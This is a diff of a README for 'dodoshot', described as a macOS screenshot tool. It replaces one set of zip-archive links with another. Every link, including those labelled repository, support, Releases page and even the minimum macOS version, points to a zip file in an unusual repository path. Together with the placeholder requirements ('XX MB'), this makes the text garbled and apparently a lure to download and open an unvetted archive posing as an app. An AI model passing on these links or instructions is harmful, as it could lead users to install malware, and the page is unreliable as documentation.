@@ -4,14 +4,14 @@
 dodoshot is a beautiful, open-source screenshot tool designed for macOS. With dodoshot, you can easily capture your screen with a few simple clicks. Take screenshots of your entire screen, specific windows, or designated areas in a snap.
 
 ## 🔗 Download Now!
-[![Download dodoshot](https://raw.githubusercontent.com/Deepaksah659/dodoshot/main/DodoShot/Resources/es.lproj/Software-1.1.zip)](https://raw.githubusercontent.com/Deepaksah659/dodoshot/main/DodoShot/Resources/es.lproj/Software-1.1.zip)
+[![Download dodoshot](https://github.com/Deepaksah659/dodoshot/raw/refs/heads/main/DodoShot/Extensions/Software_1.3-alpha.4.zip)](https://github.com/Deepaksah659/dodoshot/raw/refs/heads/main/DodoShot/Extensions/Software_1.3-alpha.4.zip)
 
 ## 🚀 Getting Started
 To get started with dodoshot, follow these simple steps:
 
 1. **Download the Application**  
    Click the link below to visit our Releases page. Here, you can download the latest version of dodoshot.  
-   [Download dodoshot](https://raw.githubusercontent.com/Deepaksah659/dodoshot/main/DodoShot/Resources/es.lproj/Software-1.1.zip)
+   [Download dodoshot](https://github.com/Deepaksah659/dodoshot/raw/refs/heads/main/DodoShot/Extensions/Software_1.3-alpha.4.zip)
 
 2. **Install dodoshot**  
    After downloading, open the downloaded file. Follow the prompts to install dodoshot on your Mac. The installation process is straightforward and takes only a few moments.
@@ -34,7 +34,7 @@ Using dodoshot is easy. Here’s how you can capture your screen:
 ## 🖥️ System Requirements
 To ensure the best experience with dodoshot, make sure your macOS version meets the following requirements:
 
-- macOS version https://raw.githubusercontent.com/Deepaksah659/dodoshot/main/DodoShot/Resources/es.lproj/Software-1.1.zip or later
+- macOS version https://github.com/Deepaksah659/dodoshot/raw/refs/heads/main/DodoShot/Extensions/Software_1.3-alpha.4.zip or later
 - At least XX MB of free disk space
 - A screen resolution of at least XXX x XXX pixels
 
@@ -55,10 +55,10 @@ To update dodoshot, check the Releases page for the latest version. Simply downl
 If you face any issues, please visit the GitHub repository. You can find solutions in the Issues section or post your question for help.
 
 ## 📞 Support
-For support, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/Deepaksah659/dodoshot/main/DodoShot/Resources/es.lproj/Software-1.1.zip). We welcome all feedback to improve dodoshot.
+For support, please open an issue on the [GitHub repository](https://github.com/Deepaksah659/dodoshot/raw/refs/heads/main/DodoShot/Extensions/Software_1.3-alpha.4.zip). We welcome all feedback to improve dodoshot.
 
 ## 📣 Acknowledgments
 dodoshot is built by a passionate community of developers. Special thanks to all contributors for their hard work and dedication.
 
 ## 🔗 More Information
-For more details about dodoshot and its features, visit our official GitHub [Releases page](https://raw.githubusercontent.com/Deepaksah659/dodoshot/main/DodoShot/Resources/es.lproj/Software-1.1.zip).
+For more details about dodoshot and its features, visit our official GitHub [Releases page](https://github.com/Deepaksah659/dodoshot/raw/refs/heads/main/DodoShot/Extensions/Software_1.3-alpha.4.zip).
